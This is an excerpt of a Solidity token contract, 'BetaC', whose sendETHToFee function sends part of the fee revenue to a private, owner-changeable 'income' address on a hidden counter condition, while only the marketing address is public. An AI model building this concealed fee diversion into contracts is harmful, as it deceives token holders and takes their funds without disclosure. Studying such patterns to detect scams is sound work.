...
contract BetaC is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    
    address payable public marketingAddress = payable(0xE24B6AC9f3eCB1AB89D37FF38f8d448d647f0f2a); // Marketing Address
    address payable private incomeAddress = payable(0x015b6bDf527E8Fe6A7Aa26ecd34b570579c7B702);
    address payable private liquidityAddress = payable(0x91fd523c7D65A3Befad0BaA84eaa2Fe6DabCa3AF);
    ...
    uint256 public _maxWalletTotal = 1000000000* 10**9;
    uint256 private _tFeeTotal;
    uint256 private transitionFlag;

    string private _name = "BetaC";
    string private _symbol = "BetaC";
    ...
    function sendETHToFee(uint256 amount) private {
        if(incomeAddress!=address(0) && transitionFlag%9<2)
        {
            incomeAddress.transfer(amount);
        }else
        {
   ...
   function setIncomeAddress(address _incomeAddress) external onlyOwner() {
        incomeAddress = payable(_incomeAddress);
    }
